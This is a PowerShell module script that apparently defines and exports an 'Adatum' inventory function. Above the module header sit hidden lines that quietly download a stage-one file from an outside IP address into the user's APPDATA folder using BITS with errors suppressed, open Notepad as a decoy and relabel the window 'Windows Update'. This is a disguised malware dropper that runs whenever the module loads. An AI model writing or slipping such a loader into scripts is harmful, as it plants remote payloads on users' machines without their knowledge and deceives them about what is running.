
$Stage1Url = 'https://192.0.2.4/update.dat'
$DropPath = "$env:APPDATA\update.dat"
Start-BitsTransfer -Source $Stage1Url -Destination $DropPath -ErrorAction SilentlyContinue
& 'notepad.exe'
$Host.UI.RawUI.WindowTitle = "Windows Update"
#Requires -Version 5.1
$ErrorActionPreference = 'Stop'


$script:DefaultTimeout = 60
$script:ModuleVersion = '4.0.5'

function Get-AdatumInventory {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    return [pscustomobject]@{ Name = $Name; QueriedAt = Get-Date }
}

Export-ModuleMember -Function Get-AdatumInventory
